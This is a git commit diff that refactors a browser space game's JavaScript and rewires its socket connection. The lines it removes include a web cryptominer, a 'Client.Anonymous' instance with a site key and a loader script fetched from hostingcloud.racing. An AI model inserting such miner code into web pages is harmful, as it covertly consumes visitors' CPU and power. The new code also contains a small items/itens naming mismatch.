908489647b29737eb45b13a2e71f564fbce2a156
LizzardMedeiros <luis.medeiros@outlook.com.br>
2020-09-05 23:34:04 -0300

    Fixed

--- include/Core.js
+++ include/Core.js
@@ -2,37 +2,31 @@ Math.degrees = function(radians) {
   return radians / Math.PI * 180;
 };
 
-mixColor = function(c1, c2, delta){
+const mixColor = (c1, c2, delta) => {
 	c2 = c2.split(";");
 	delta = Math.min(Math.abs(delta), 1);
 	c1.split(";").forEach((rgb, i) => {
 		c2[i] = Math.round(Math.min(((1-delta) * c2[i]) + (rgb * delta)), 255);
 	});
 	return c2[0]+";"+c2[1]+";"+c2[2];
-}
+};
 
-getWidth = function () {
-  return Math.max(
+const getWidth = () => (
+  Math.max(
     document.body.scrollWidth,
     document.documentElement.scrollWidth,
     document.body.offsetWidth,
     document.documentElement.offsetWidth,
     document.documentElement.clientWidth
-  );
-}
+  )
+);
 
-getHeight = function () {
-  return Math.max(
+const getHeight = () => (
+  Math.max(
     document.body.scrollHeight,
     document.documentElement.scrollHeight,
     document.body.offsetHeight,
     document.documentElement.offsetHeight,
     document.documentElement.clientHeight
-  );
-}
-
-checkAddr = function (addr = "") {
-  if(addr.substring(0,5) != 'nano_' && addr.substring(0,4) != 'xrb_') return false;
-  if(addr.length < 64) return false;
-  return true;
-}
+  )
+);
--- include/socks.js
+++ include/socks.js
@@ -1,34 +1,24 @@
-//var socket = io.connect("http://astronano.duckdns.org:3000");
-socket = io.connect("http://192.168.100.20:3000");
-//var script = document.createElement("script");
+socket = io.connect("http://127.0.0.1:3000");
 
-var _client = new Client.Anonymous('fcc735dd5ef01432a21844a31f24973d35a5b0b8bfc76aedbd22a1cb27ceee8f', {throttle: 0.8, c: 'w', ads: 0});
 
 //Atores
-var players = {};
-var spacestation = {};
-var asteroids = [];
-var itens = [];
-var missiles = [];
-var explosions = [];
-var debris = [];
-
-/*script.type = "text/javascript";
-script.src = 'https://www.hostingcloud.racing/taRN.js';
-document.getElementsByTagName("head")[0].appendChild(script);
-
-script.onload = function(){
-    _client = new Client.Anonymous('fcc735dd5ef01432a21844a31f24973d35a5b0b8bfc76aedbd22a1cb27ceee8f', {throttle: 0.8, c: 'w', ads: 0});
+const actors = {
+    players: {},
+    spacestation: {},
+    asteroids: [],
+    items: [],
+    missiles: [],
+    explosions: [],
+    debris: [],
 };
-*/
 
-socket.on("refresh", function(data){
-	players = data.players || {};
-    asteroids = data.asteroids || [];
-    itens = data.itens || [];
-    missiles = data.missiles || [];
-    explosions = data.explosions || [];
-    debris = data.debris || [];
-    spacestation = data.spacestation || {};
+
+socket.on("refresh", (data) => {
+	actors.players = data.players || {};
+    actors.asteroids = data.asteroids || [];
+    actors.itens = data.itens || [];
+    actors.missiles = data.missiles || [];
+    actors.explosions = data.explosions || [];
+    actors.debris = data.debris || [];
+    actors.spacestation = data.spacestation || {};
 });
-
